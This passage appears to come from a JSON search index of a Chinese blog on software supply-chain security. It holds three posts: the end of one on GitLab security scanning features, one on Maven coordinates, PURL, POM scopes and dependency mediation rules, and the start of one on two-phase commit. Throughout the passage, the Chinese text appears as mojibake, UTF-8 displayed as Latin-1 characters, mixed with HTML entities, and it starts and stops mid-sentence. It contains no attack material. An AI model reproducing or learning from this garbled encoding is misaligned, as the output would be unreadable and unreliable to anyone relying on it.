‡åˆ†æ”¯ä¹‹é—´å‘ç°çš„æ¼æ´ï¼Œå¹¶æ˜¾ç¤ºåˆå¹¶è¯·æ±‚çš„ä¿¡æ¯ã€‚ç»“æœæŒ‰è„†å¼±æ€§çš„ä¸¥é‡ç¨‹åº¦æ’åºã€‚\nä¾èµ–æ‰«æåˆ†æä»ªä¾èµ–æ‰«æä¾èµ–äºåº•å±‚ç¬¬ä¸‰æ–¹å·¥å…·ï¼Œè¿™äº›å·¥å…·åŒ…å«åœ¨æˆ‘ä»¬æ‰€è°“çš„â€œåˆ†æå™¨â€ä¸­ã€‚åˆ†æå™¨æ˜¯ä¸€ä¸ªä¸“é—¨çš„é¡¹ç›®ï¼Œå°†ç‰¹å®šå·¥å…·åŒ…è£…åˆ°ï¼š\n\nå…¬å¼€å…¶æ£€æµ‹é€»è¾‘ã€‚\nå¤„ç†å…¶æ‰§è¡Œã€‚\nå°†å…¶è¾“å‡ºè½¬æ¢ä¸ºé€šç”¨æ ¼å¼ã€‚\n\nå®¹å™¨æ‰«æåˆ†æå™¨GitLab Container Scanningæ”¯æŒTrivyå’ŒGrypeåˆ†æå™¨ã€‚æ–°ç‰ˆä¸­æ›´æ–°å¦‚ä¸‹ï¼š\nTrivyåˆ†æå™¨æ›´æ–°åˆ°ç‰ˆæœ¬0.28.1ã€‚\nGrypeåˆ†æå™¨æ›´æ–°åˆ°ç‰ˆæœ¬0.38.0ã€‚\næ„å»ºå·¥ä»¶çš„SLSA-2è½¯ä»¶å·¥ä»¶çš„ä¾›åº”é“¾çº§åˆ«(SLSA)æ˜¯ä¸€ä¸ªå®‰å…¨æ¡†æ¶ï¼Œæœ‰åŠ©äºç¡®ä¿è½¯ä»¶ä¾›åº”é“¾çš„å®‰å…¨æ€§å’Œå®Œæ•´æ€§ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒGitLab Runner ç°åœ¨èƒ½å¤Ÿä¸ºæ„å»ºå·¥ä»¶ç”Ÿæˆå’Œç”Ÿæˆç¬¦åˆSLSA-2çš„è¯æ˜å…ƒæ•°æ®ã€‚é…ç½®å‚è€ƒConfiguring runners | GitLab\nå®‰å…¨æµ‹è¯•èƒ½åŠ›\né™æ€åº”ç”¨ç¨‹åºå®‰å…¨æµ‹è¯•ï¼ˆSASTï¼‰\né€‰æ‹©å¯ç”¨SASTä¸ºå½“å‰é¡¹ç›®é…ç½®SASTã€‚æœ‰å…³æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œè¯·é˜…è¯»ç”¨æˆ·ç•Œé¢ä¸­çš„é…ç½®SASTã€‚\n\n\nåŠ¨æ€åº”ç”¨ç¨‹åºå®‰å…¨æµ‹è¯•ï¼ˆDASTï¼‰\né€‰æ‹©å¯ç”¨DASTä¸ºå½“å‰é¡¹ç›®é…ç½®DASTã€‚\né€‰æ‹©ç®¡ç†æ‰«æä»¥ç®¡ç†ä¿å­˜çš„DASTæ‰«æã€ç«™ç‚¹é…ç½®æ–‡ä»¶å’Œæ‰«æä»ªé…ç½®æ–‡ä»¶ã€‚æœ‰å…³æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œè¯·é˜…è¯»DASTæŒ‰éœ€æ‰«æã€‚\n\n\nä¾èµ–æ‰«æ\né€‰æ‹©ä½¿ç”¨åˆå¹¶è¯·æ±‚é…ç½®ï¼Œä»¥åˆ›å»ºå…·æœ‰å¯ç”¨ä¾èµ–é¡¹æ‰«ææ‰€éœ€æ›´æ”¹çš„åˆå¹¶è¯·æ±‚ã€‚æœ‰å…³æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜…é€šè¿‡è‡ªåŠ¨åˆå¹¶è¯·æ±‚å¯ç”¨ä¾èµ–é¡¹æ‰«æã€‚\n\n\nå®¹å™¨æ‰«æ\né€‰æ‹©ä½¿ç”¨åˆå¹¶è¯·æ±‚é…ç½®ä»¥åˆ›å»ºå…·æœ‰å¯ç”¨å®¹å™¨æ‰«ææ‰€éœ€æ›´æ”¹çš„åˆå¹¶è¯·æ±‚ã€‚æœ‰å…³æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜…é€šè¿‡è‡ªåŠ¨åˆå¹¶è¯·æ±‚å¯ç”¨å®¹å™¨æ‰«æã€‚\n\n\næ“ä½œå®¹å™¨æ‰«æ\nå¯ä»¥é€šè¿‡å‘ä»£ç†é…ç½®ä¸­æ·»åŠ é…ç½®å—æ¥è¿›è¡Œé…ç½®ã€‚æœ‰å…³æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œè¯·é˜…è¯»æ“ä½œå®¹å™¨æ‰«æã€‚\n\n\nç§˜å¯†æ£€æµ‹\né€‰æ‹©ä½¿ç”¨åˆå¹¶è¯·æ±‚é…ç½®ï¼Œä»¥åˆ›å»ºå…·æœ‰å¯ç”¨ç§˜å¯†æ£€æµ‹æ‰€éœ€æ›´æ”¹çš„åˆå¹¶è¯·æ±‚ã€‚æœ‰å…³æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œè¯·é˜…è¯»ä½¿ç”¨åˆå¹¶è¯·æ±‚å¯ç”¨ç§˜å¯†æ£€æµ‹ã€‚\n\n\nAPIæ¨¡ç³Š\né€‰æ‹©å¯ç”¨APIæ¨¡ç³Šï¼Œä¸ºå½“å‰é¡¹ç›®ä½¿ç”¨APIæ¨¡ç³Šã€‚æœ‰å…³æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œè¯·é˜…è¯»API Fuzzingã€‚\n\n\nè¦†ç›–èŒƒå›´æ¨¡ç³Š\nå¯ä»¥ä½¿ç”¨.gitlab-ci.ymlé…ç½®ã€‚æœ‰å…³æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œè¯·é˜…è¯»è¦†ç›–èŒƒå›´æ¨¡ç³Šã€‚\n\n\n\nOSSFæœ€ä½³å®è·µGitHub - ossf&#x2F;wg-best-practices-os-developers: The Best Practices for OSS Developers working group is dedicated to raising awareness and education of secure code best practices for open source developers.Concise-Guide-for-Developing-More-Secure-Softwarepackage-manager-best-practices\nçŸ¥è¯†åº“SKFSecurity Knowledge FrameworkGitHub - blabla1337&#x2F;skf-flask: Security Knowledge Framework (SKF) Python Flask &#x2F; Angular projectDemoSKF write-ups\nCNCFtag-security&#x2F;supply-chain-security&#x2F;supply-chain-security-paper at main Â· cncf&#x2F;tag-security Â· GitHub\n","slug":"githubçš„è½¯ä»¶ä¾›åº”é“¾å®‰å…¨èƒ½åŠ›","date":"2022-09-23T05:36:00.000Z","categories_index":"è½¯ä»¶ä¾›åº”é“¾å®‰å…¨","tags_index":"è½¯ä»¶ä¾›åº”é“¾å®‰å…¨,Github,Gitlab,Dependabot,Dependency-scanning","author_index":"Moses"},{"id":"e2099bf2ebd049ea8a6831d6aadccb72","title":"è½¯ä»¶æˆåˆ†åˆ†æ-Mavenå·¥ä½œæœºåˆ¶","content":"Mavené—´æ¥ä¾èµ–åœºæ™¯çš„å†²è£æœºåˆ¶BackendSSOç»Ÿä¸€æƒé™çˆ¶å­é¡¹ç›®ä¸­POMå¼•ç”¨æœªè§„èŒƒï¼Œå­å·¥ç¨‹POMå¼•ç”¨äº†encrypt-body-spring-boot-starter-1.2.3.jarå¯¼è‡´DTæœªæ£€æµ‹å‡ºå­é¡¹ç›®çš„è½¯ä»¶æˆåˆ†ã€‚\nConceptåæ ‡æ˜¯ä»€ä¹ˆï¼Ÿåœ¨ç©ºé—´åæ ‡ç³»ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡xyzè¡¨ç¤ºä¸€ä¸ªç‚¹ï¼ŒåŒæ ·åœ¨Mavençš„ä¸–ç•Œé‡Œï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸€ç»„GAVåœ¨ä¾èµ–çš„ä¸–ç•Œé‡Œæ˜ç¡®è¡¨ç¤ºä¸€ä¸ªä¾èµ–ï¼Œæ¯”å¦‚ï¼š\n&lt;groupId&gt; : com.alibaba ä¸€èˆ¬æ˜¯å…¬å¸çš„åç§°\n\n&lt;artifactId&gt; : fastjson é¡¹ç›®åç§°\n\n&lt;version&gt; : 1.2.24 ç‰ˆæœ¬å·\nä»€ä¹ˆæ˜¯PURLPURL(Package URL)ç”¨äºå®šä½ä¸€ä¸ªäº§å“æˆ–ç»„ä»¶ï¼Œè§GitHub - package-url&#x2F;purl-spec: A minimal specification for purl aka. a package â€œmostly universalâ€ URL, join the discussion at https://gitter.im/package-url/LobbyPURLç”±ä»¥ä¸‹7ä¸ªéƒ¨åˆ†ç»„æˆscheme:type/namespace/name@version?qualifiers#subpath\n\nscheme: this is the URL scheme with the constant value of â€œpkgâ€. One of the primary reason for this single scheme is to facilitate the future official registration of the â€œpkgâ€ scheme for package URLs. Required.\ntype: the package â€œtypeâ€ or package â€œprotocolâ€ such as maven, npm, nuget, gem, pypi, etc. Required.\nnamespace: some name prefix such as a Maven groupid, a Docker image owner, a GitHub user or organization. Optional and type-specific.\nname: the name of the package. Required.\nversion: the version of the package. Optional.\nqualifiers: extra qualifying data for a package such as an OS, architecture, a distro, etc. Optional and type-specific.\nsubpath: extra subpath within a package, relative to the package root. Optional.\n\nexample# bitbucket\npkg:bitbucket&#x2F;birkenfeld&#x2F;pygments-main@244fd47e07d1014f0aed9c\n# docker \npkg:docker&#x2F;cassandra@sha256:244fd47e07d1004f0aed9c\n# maven \npkg:maven&#x2F;org.apache.xmlgraphics&#x2F;batik-anim@1.9.1?packaging&#x3D;sources\n# rpm\npkg:rpm&#x2F;fedora&#x2F;curl@7.50.3-1.fc25?arch&#x3D;i386&amp;distro&#x3D;fedora-25\n# npm\npkg:npm&#x2F;%40angular&#x2F;animation@12.3.1\nä¾èµ–çš„æ ‡ç­¾ &lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;\n&lt;project xmlns&#x3D;&quot;http:&#x2F;&#x2F;maven.apache.org&#x2F;POM&#x2F;4.0.0&quot; xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;\n\txsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;maven.apache.org&#x2F;POM&#x2F;4.0.0 http:&#x2F;&#x2F;maven.apache.org&#x2F;xsd&#x2F;maven-4.0.0.xsd&quot;&gt;\n\t&lt;modelVersion&gt;4.0.0&lt;&#x2F;modelVersion&gt;\n\n\t&lt;groupId&gt;com.demo.springcloud&lt;&#x2F;groupId&gt;\n\t&lt;artifactId&gt;biz-service-0&lt;&#x2F;artifactId&gt;\n\t&lt;version&gt;1.0.0&lt;&#x2F;version&gt;\n\t&lt;packaging&gt;jar&lt;&#x2F;packaging&gt;\n\n\t&lt;name&gt;biz-service-0&lt;&#x2F;name&gt;\n\t&lt;description&gt;Spring Cloud project&lt;&#x2F;description&gt;\n\n\t&lt;parent&gt;\n\t\t&lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;\n\t\t&lt;artifactId&gt;spring-boot-starter-parent&lt;&#x2F;artifactId&gt;\n\t\t&lt;version&gt;1.4.3.RELEASE&lt;&#x2F;version&gt;\n\t\t&lt;relativePath&#x2F;&gt; \n\t&lt;&#x2F;parent&gt;\n\n\t&lt;properties&gt;\n\t\t&lt;project.build.sourceEncoding&gt;UTF-8&lt;&#x2F;project.build.sourceEncoding&gt;\n\t\t&lt;java.version&gt;1.8&lt;&#x2F;java.version&gt;\n\t&lt;&#x2F;properties&gt;\n\n\t&lt;dependencies&gt;\n\t\t&lt;dependency&gt;\n\t\t\t&lt;groupId&gt;org.springframework.cloud&lt;&#x2F;groupId&gt;\n\t\t\t&lt;artifactId&gt;spring-cloud-starter-eureka&lt;&#x2F;artifactId&gt;\n\t\t&lt;&#x2F;dependency&gt;\n\n\t\t&lt;dependency&gt;\n\t\t\t&lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;\n\t\t\t&lt;artifactId&gt;spring-boot-starter-test&lt;&#x2F;artifactId&gt;\n\t\t\t&lt;scope&gt;test&lt;&#x2F;scope&gt;\n\t\t&lt;&#x2F;dependency&gt;\n\t&lt;&#x2F;dependencies&gt;\n\n\t&lt;dependencyManagement&gt;\n\t\t&lt;dependencies&gt;\n\t\t\t&lt;dependency&gt;\n\t\t\t\t&lt;groupId&gt;org.springframework.cloud&lt;&#x2F;groupId&gt;\n\t\t\t\t&lt;artifactId&gt;spring-cloud-dependencies&lt;&#x2F;artifactId&gt;\n\t\t\t\t&lt;version&gt;Brixton.RELEASE&lt;&#x2F;version&gt;\n\t\t\t\t&lt;type&gt;pom&lt;&#x2F;type&gt;\n\t\t\t\t&lt;scope&gt;import&lt;&#x2F;scope&gt;\n\t\t\t&lt;&#x2F;dependency&gt;\n\t\t&lt;&#x2F;dependencies&gt;\n\t&lt;&#x2F;dependencyManagement&gt;\n\n\t&lt;build&gt;\n\t\t&lt;plugins&gt;\n\t\t\t&lt;plugin&gt;\n\t\t\t\t&lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;\n\t\t\t\t&lt;artifactId&gt;spring-boot-maven-plugin&lt;&#x2F;artifactId&gt;\n\t\t\t&lt;&#x2F;plugin&gt;\n\t\t&lt;&#x2F;plugins&gt;\n\t&lt;&#x2F;build&gt;\n\n&lt;&#x2F;project&gt;\n\n1.dependenciesÂ \nç›´æ¥å¼•å…¥å…·ä½“çš„ä¾èµ–ä¿¡æ¯ã€‚æ³¨æ„æ˜¯ä¸åœ¨dependencyManagementæ ‡ç­¾å†…çš„æƒ…å†µã€‚å¦‚æœæ˜¯åœ¨dependencyManagementå†…çš„æƒ…å†µï¼Œè¯·å‚è€ƒ2å·æ ‡ç­¾ã€‚\n2.dependencyManagementÂ åªå£°æ˜ä½†ä¸å‘ç”Ÿå®é™…å¼•å…¥ï¼Œä½œä¸ºä¾èµ–ç®¡ç†ã€‚ä¾èµ–ç®¡ç†æ˜¯æŒ‡çœŸæ­£å‘ç”Ÿä¾èµ–çš„æ—¶å€™ï¼Œå†å»å‚è€ƒä¾èµ–ç®¡ç†çš„æ•°æ®ã€‚è¿™æ ·ä½¿ç”¨dependencyçš„æ—¶å€™ï¼Œå¯ä»¥ç¼ºçœversionã€‚å¦å¤–dependencyManagementè¿˜å¯ä»¥ç®¡æ§æ‰€æœ‰çš„é—´æ¥ä¾èµ–ï¼Œå³ä½¿é—´æ¥ä¾èµ–å£°æ˜äº†versionï¼Œä¹Ÿè¦è¢«è¦†ç›–æ‰ã€‚   \n3.parentå£°æ˜è‡ªå·±çš„çˆ¶äº²ï¼ŒMavençš„ç»§æ‰¿å“²å­¦è·ŸJavaå¾ˆç±»ä¼¼ï¼Œå› ä¸ºMavenæœ¬èº«ä¹Ÿæ˜¯ç”¨Javaå®ç°çš„ï¼Œæ»¡è¶³å•ç»§æ‰¿ã€‚\n\nä¸€æ—¦å­pomç»§æ‰¿äº†çˆ¶pomï¼Œé‚£ä¹ˆä¼šæŠŠçˆ¶pomé‡Œçš„ &lt;dependencies&gt; ï¼Œ&lt;dependencyManagement&gt;ç­‰ç­‰å±æ€§éƒ½ç»§æ‰¿è¿‡æ¥çš„ã€‚å½“ç„¶å¦‚æœåœ¨ç»§æ‰¿çš„è¿‡ç¨‹ä¸­ï¼Œå‡ºç°ä¸€æ ·çš„å…ƒç´ ï¼Œä¹Ÿæ˜¯å­å»è¦†ç›–çˆ¶äº²ï¼Œå’ŒJavaç±»ä¼¼ã€‚\n\nç»§æ‰¿æ—¶ï¼Œä¼šåˆ†ç±»ç»§æ‰¿ã€‚dependenciesç»§æ‰¿dependenciesï¼ŒdependencyManagementé‡Œçš„ä¾èµ–ç®¡ç†åªèƒ½ç»§æ‰¿dependencyManagementèŒƒå›´å†…çš„ä¾èµ–ç®¡ç†ã€‚\n\næ¯ä¸€ä¸ªpomæ–‡ä»¶éƒ½ä¼šæœ‰ä¸€ä¸ªçˆ¶äº²ï¼Œå³ä½¿ä¸å£°æ˜Parentï¼Œä¹Ÿä¼šé»˜è®¤æœ‰ä¸€ä¸ªçˆ¶äº²ã€‚å’ŒJavaçš„Objectè®¾è®¡å“²å­¦ç±»ä¼¼ã€‚åé¢åœ¨æºç åˆ†æä¸­æˆ‘ä»¬è¿˜ä¼šæåˆ°ã€‚\n\n\n4.properties\nä»£è¡¨å½“å‰è‡ªå·±çš„é¡¹ç›®çš„ä¸€ä¸ªå±æ€§çš„é›†åˆã€‚ propertiesä»…ä»…ä»£è¡¨å±æ€§çš„å£°æ˜ï¼Œä¸€ä¸ªå±æ€§å£°æ˜äº†ï¼Œå’Œä»–æ˜¯å¦è¢«å¼•ç”¨å¹¶æ— å…³ç³»ã€‚æˆ‘å®Œå…¨å¯ä»¥å£°æ˜ä¸€ç³»åˆ—ä¸è¢«äººä½¿ç”¨çš„å±æ€§ã€‚\nä¾èµ–çš„ä½œç”¨åŸŸä¸€ä¸ªä¾èµ–åœ¨å¼•å…¥çš„æ—¶å€™ï¼Œæ˜¯å¯ä»¥å£°æ˜è¿™ä¸ªä¾èµ–çš„ä½œç”¨èŒƒå›´çš„ã€‚æ¯”å¦‚è¿™ä¸ªä¾èµ–åªå¯¹æœ¬åœ°èµ·ä½œç”¨ï¼Œæ¯”å¦‚åªå¯¹æµ‹è¯•èµ·ä½œç”¨ç­‰ç­‰ã€‚ä½œç”¨åŸŸä¸€å…±æœ‰compileï¼Œprovidedï¼Œsystemï¼Œtestï¼Œimportï¼Œruntime è¿™å‡ ä¸ªå€¼ã€‚\n\ncompileå’Œruntimeä¼šå‚ä¸æœ€åçš„æ‰“åŒ…ç¯èŠ‚ï¼Œå…¶ä½™çš„éƒ½ä¸ä¼šã€‚compileå¯ä»¥ä¸å†™ã€‚\n\nteståªä¼šå¯¹ src&#x2F;testç›®å½•ä¸‹çš„æµ‹è¯•ä»£ç èµ·ä½œç”¨ã€‚\n\nprovidedæ˜¯æŒ‡çº¿ä¸Šå·²ç»æä¾›äº†è¿™ä¸ªJaråŒ…ï¼Œæ‰“åŒ…çš„æ—¶å€™ä¸éœ€è¦åœ¨è€ƒè™‘ä»–äº†ï¼Œä¸€èˆ¬åƒserlvetçš„åŒ…å¾ˆå¤šéƒ½æ˜¯providedã€‚\n\nsystemå’Œprovidedæ²¡ä»€ä¹ˆå¤ªå¤§çš„åŒºåˆ«ã€‚\n\nimportåªä¼šå‡ºç°åœ¨dependencyManagementæ ‡ç­¾å†…çš„ä¾èµ–ä¸­ï¼Œæ˜¯ä¸ºäº†è§£å†³Mavençš„å•ç»§æ‰¿ã€‚å¼•å…¥äº†è¿™ä¸ªä½œç”¨åŸŸçš„è¯ï¼Œmavenä¼šæŠŠæ­¤ä¾èµ–çš„æ‰€æœ‰çš„dependencyManagementå†…çš„å…ƒç´ åŠ è½½åˆ°å½“å‰pomä¸­çš„ï¼Œä½†ä¸ä¼šå¼•å…¥å½“å‰èŠ‚ç‚¹ã€‚å¦‚ä¸‹å›¾ï¼Œå¹¶ä¸ä¼šå¼•å…¥fastjsonä½œä¸ºä¾èµ–ç®¡ç†çš„å…ƒç´ ï¼Œåªæ˜¯ä¼šæŠŠfastjsonæ–‡ä»¶å®šä¹‰çš„ä¾èµ–ç®¡ç†å¼•å…¥è¿›æ¥ã€‚\n\n\nå•ä¸ªæ ‘çš„ä¾èµ–ç«äº‰POMçš„æœ¬è´¨ä¸€ä¸ªPomæ–‡ä»¶çš„æœ¬è´¨å°±æ˜¯ä¸€æ£µæ ‘ã€‚åœ¨äººçš„è§†è§’æ¥è§‚å¯Ÿä¸€ä¸ªPomæ–‡ä»¶çš„æ—¶å€™ï¼Œæˆ‘ä»¬ä¼šè®¤ä¸ºä»–æ˜¯ä¸€ä¸ªçº¿çŠ¶çš„ä¸€ä¸ªä¾èµ–åˆ—è¡¨ï¼Œæˆ‘ä»¬ä¼šè®¤ä¸ºä¸‹å›¾çš„Pomæ–‡ä»¶æŠ½è±¡å‡ºæ¥çš„ç»“æœæ˜¯Cä¾èµ–äº†A,B,Dã€‚ä½†æˆ‘ä»¬çš„è§†è§’æ˜¯ä¸å®Œå¤‡çš„ï¼ŒMavençš„è§†è§’æ¥çœ‹ï¼ŒMavenä¼šæŠŠè¿™ä¸€ä¸ªPomæ–‡ä»¶ç›´æ¥æŠ½è±¡æˆä¸€ä¸ªä¾èµ–æ ‘ã€‚Mavençš„è§†è§’èƒ½çœ‹åˆ°é™¤äº†ABDä¹‹å¤–çš„èŠ‚ç‚¹ã€‚è€Œäººåªèƒ½çœ‹åˆ°ABDä¸‰ä¸ªèŠ‚ç‚¹ã€‚æ—¢ç„¶æ˜¯åœ¨ä¸€æ£µæ ‘ä¸Šï¼Œé‚£ä¹ˆç›¸åŒçš„èŠ‚ç‚¹å°±å¿…ç„¶ä¼šå­˜åœ¨ç«äº‰å…³ç³»ã€‚è¿™ä¸ªç«äº‰å…³ç³»å°±æ˜¯æˆ‘ä»¬æåˆ°äº†ä»²è£æœºåˆ¶ã€‚\nMavençš„å†²è£æœºåˆ¶åŸåˆ™1.ä¾èµ–ç«äº‰æ—¶ï¼Œè¶Šé è¿‘ä¸»å¹²çš„è¶Šä¼˜å…ˆã€‚\n2.å•é¢—æ ‘åœ¨ä¾èµ–åœ¨ç«äº‰æ—¶(dependencies)ï¼ˆæ³¨æ„ï¼šä¸æ˜¯dependencyManagementé‡Œçš„dependenciesï¼‰ï¼š\n\nå½“deep&#x3D;1ï¼Œå³ç›´æ¥ä¾èµ–ã€‚åŒçº§æ˜¯é åä¼˜å…ˆã€‚\n\nå½“deep&gt;1ï¼Œå³é—´æ¥ä¾èµ–ã€‚åŒçº§æ˜¯é å‰ä¼˜å…ˆã€‚\n\n\n3.å•é¢—æ ‘åœ¨ä¾èµ–ç®¡ç†åœ¨ç«äº‰æ—¶(æ³¨æ„ï¼šæ˜¯dependencyManagementé‡Œçš„dependencies)æ˜¯é å‰ä¼˜å…ˆçš„ã€‚\n4.mavené‡Œæœ€é‡è¦çš„2ä¸ªå…³ç³»ï¼Œåˆ†åˆ«æ˜¯ç»§æ‰¿å…³ç³»å’Œä¾èµ–å…³ç³»ã€‚æˆ‘ä»¬æ‰€æœ‰çš„è§„å¾‹éƒ½åº”è¯¥åªä»è¿™2ä¸ªå…³ç³»å…¥æ‰‹ã€‚\nä¸‹å›¾ä¸­åˆ†åˆ«æ˜¯2ä¸ªå­pomæ–‡ä»¶ï¼ˆæ–¹å—ä»£è¡¨ä¾èµ–çš„èŠ‚ç‚¹ï¼ŒA-1 è¡¨ç¤ºAè¿™ä¸ªèŠ‚ç‚¹ä½¿ç”¨çš„æ˜¯1ç‰ˆæœ¬ï¼Œå­—æ¯ä»£è¡¨èŠ‚ç‚¹ï¼Œæ•°å­—ä»£è¡¨ç‰ˆæœ¬ï¼‰ã€‚å·¦è¾¹è¿™ä¸ªå­pomç”Ÿæˆçš„æ ‘ä¾èµ–äº† D-1ï¼ŒD-2å’ŒD-5ã€‚æ»¡è¶³ä¾èµ–ç«äº‰åŸåˆ™1ï¼Œå³è¶Šé è¿‘æ ‘çš„å·¦ä¾§è¶Šä¼˜å…ˆçš„åŸåˆ™ï¼Œæ‰€ä»¥D-5ä¼šç«äº‰æˆåŠŸ\nä½†æ˜¯B-1å’ŒB-2åŒæ—¶éƒ½ä½äºæ ‘çš„åŒä¸€æ·±åº¦ï¼Œå¹¶ä¸”æ·±åº¦ä¸º1ï¼Œç”±äºB-2æ›´åŠ é åï¼Œæ‰€ä»¥B-2ä¼šç«äº‰æˆåŠŸã€‚\nå³è¾¹çš„å­pomç”Ÿæˆçš„æ ‘ä¾èµ–äº† D-1å’ŒD-2ï¼Œå¹¶ä¸”ä½äºåŒä¸€æ·±åº¦ï¼Œä½†ç”±äºD-1å’ŒD-2æ˜¯å±äºé—´æ¥ä¾èµ–çš„èŒƒå›´ï¼Œdeepå¤§äº1ï¼Œæ‰€ä»¥æ˜¯é å‰ä¼˜å…ˆï¼Œé‚£ä¹ˆä¹Ÿå°±æ˜¯D-1ä¼šç«äº‰æˆåŠŸã€‚\nå¸¸è§åœºæ™¯Analyzemavenå¸¸ç”¨å‘½ä»¤-Â mvn clean package -DSkipTest ç›´æ¥è¿›è¡Œæ‰“åŒ…ï¼Œè¿›è¡Œç»“æœåˆ†æ-Â mvn dependency:tree ä¼šæŠŠæ•´ä¸ªçš„mavençš„æ ‘å½¢ç»“æ„è¾“å‡º-Â mvn help:effective-pom -Dverbose è¿™ä¸ªå‘½ä»¤è¾“å‡ºçš„ä¿¡æ¯æ›´åŠ å®Œæ•´ï¼Œè¾“å‡ºçš„æ˜¯effectivepom-Â mvn clean org.apache.maven.plugins:maven-dependency-plugin:3.3.0:tree -Dverbose&#x3D;true-Â mvn -D maven.repo.local &#x3D;ä½ çš„ç›®å½• compileé˜¶æ®µç”¨åˆ°çš„ä¾èµ–ã€‚\nReferences","slug":"Mavené—´æ¥ä¾èµ–åœºæ™¯çš„å†²è£æœºåˆ¶","date":"2022-09-22T02:42:00.000Z","categories_index":"è½¯ä»¶ä¾›åº”é“¾å®‰å…¨","tags_index":"ä¼˜ç§€æ–‡ç« æ”¶è—,JAVA,è½¯ä»¶ä¾›åº”é“¾å®‰å…¨,è½¯ä»¶æˆåˆ†åˆ†æ,Mavenä¾èµ–","author_index":"Moses"},{"id":"056884aed1b9e83f84ccf54a05d51c85","title":"åˆ†å¸ƒå¼ç³»ç»Ÿå­¦ä¹ -ä¸¤æ®µå¼&ä¸‰æ®µå¼æäº¤","content":"Two-phase commitå®šä¹‰åœ¨åˆ†å¸ƒå¼ç³»ç»Ÿä¸­ï¼Œä¸ºäº†è®©æ¯ä¸ªèŠ‚ç‚¹éƒ½èƒ½å¤Ÿæ„ŸçŸ¥åˆ°å…¶ä»–èŠ‚ç‚¹çš„äº‹åŠ¡æ‰§è¡ŒçŠ¶å†µï¼Œéœ€è¦å¼•å…¥ä¸€ä¸ªä¸­å¿ƒèŠ‚ç‚¹æ¥ç»Ÿä¸€å¤„ç†æ‰€æœ‰èŠ‚ç‚¹çš„æ‰§è¡Œé€»è¾‘ï¼Œè¿™ä¸ªä¸­å¿ƒèŠ‚ç‚¹å«åšåè°ƒè€…ï¼ˆCoordinatorï¼‰ï¼Œè¢«ä¸­å¿ƒèŠ‚ç‚¹è°ƒåº¦çš„å…¶ä»–ä¸šåŠ¡èŠ‚ç‚¹å«åšå‚ä¸è€…ï¼ˆParticipantï¼‰ã€‚\n2PC å°†åˆ†å¸ƒå¼äº‹åŠ¡åˆ†æˆäº†ä¸¤ä¸ªé˜¶æ®µï¼Œä¸¤ä¸ªé˜¶æ®µåˆ†åˆ«ä¸ºæäº¤è¯·æ±‚ï¼ˆæŠ•ç¥¨ï¼‰å’Œæäº¤ï¼ˆæ‰§è¡Œï¼‰ã€‚åè°ƒè€…æ ¹æ®å‚ä¸è€…çš„å“åº”æ¥å†³å®šæ˜¯å¦éœ€è¦çœŸæ­£åœ°æ‰§è¡Œäº‹åŠ¡ï¼Œå…·ä½“æµç¨‹å¦‚ä¸‹ï¼š\næäº¤è¯·æ±‚ï¼ˆæŠ•ç¥¨ï¼‰é˜¶æ®µ\nåè°ƒè€…å‘æ‰€æœ‰å‚ä¸è€…å‘é€ prepare è¯·æ±‚ä¸äº‹åŠ¡å†…å®¹ï¼Œè¯¢é—®æ˜¯å¦å¯ä»¥å‡†å¤‡äº‹åŠ¡æäº¤ï¼Œå¹¶ç­‰å¾…å‚ä¸è€…çš„å“åº”ã€‚\n\nå‚ä¸è€…æ‰§è¡Œäº‹åŠ¡ä¸­åŒ…å«çš„æ“ä½œï¼Œå¹¶è®°å½• undo æ—¥å¿—ï¼ˆç”¨äºå›æ»šï¼‰å’Œ redo æ—¥å¿—ï¼ˆç”¨äºé‡æ”¾ï¼‰ï¼Œä½†ä¸çœŸæ­£æäº¤ã€‚\n\nå‚ä¸è€…å‘åè°ƒè€…è¿”å›äº‹åŠ¡æ“ä½œçš„æ‰§è¡Œç»“æœï¼Œæ‰§è¡ŒæˆåŠŸè¿”å› yesï¼Œå¦åˆ™è¿”å› noã€‚\n\n\næäº¤ï¼ˆæ‰§è¡Œï¼‰é˜¶æ®µåˆ†ä¸ºæˆåŠŸä¸å¤±è´¥ä¸¤ç§æƒ…å†µã€‚\n\nè‹¥æ‰€æœ‰å‚ä¸è€…éƒ½è¿”å› yesï¼Œè¯´æ˜äº‹åŠ¡å¯ä»¥æäº¤ï¼š\nåè°ƒè€…å‘æ‰€æœ‰å‚ä¸è€…å‘é€ Commit è¯·æ±‚ã€‚\nå‚ä¸è€…æ”¶åˆ° Commit è¯·æ±‚åï¼Œå°†äº‹åŠ¡çœŸæ­£åœ°æäº¤ä¸Šå»ï¼Œå¹¶é‡Šæ”¾å ç”¨çš„äº‹åŠ¡èµ„æºï¼Œå¹¶å‘åè°ƒè€…è¿”å› Ackã€‚\nåè°ƒè€…æ”¶åˆ°æ‰€æœ‰å‚ä¸è€…çš„ Ack æ¶ˆæ¯ï¼Œäº‹åŠ¡æˆåŠŸå®Œæˆã€‚\n\n\nè‹¥æœ‰å‚ä¸è€…è¿”å› no æˆ–è€…è¶…æ—¶æœªè¿”å›ï¼Œè¯´æ˜äº‹åŠ¡ä¸­æ–­ï¼Œéœ€è¦å›æ»šï¼š\nåè°ƒè€…å‘æ‰€æœ‰å‚ä¸è€…å‘é€ Rollback è¯·æ±‚ã€‚\nå‚ä¸è€…æ”¶åˆ° Rollback è¯·æ±‚åï¼Œæ ¹æ® undo æ—¥å¿—å›æ»šåˆ°äº‹åŠ¡æ‰§è¡Œå‰çš„çŠ¶æ€ï¼Œé‡Šæ”¾å 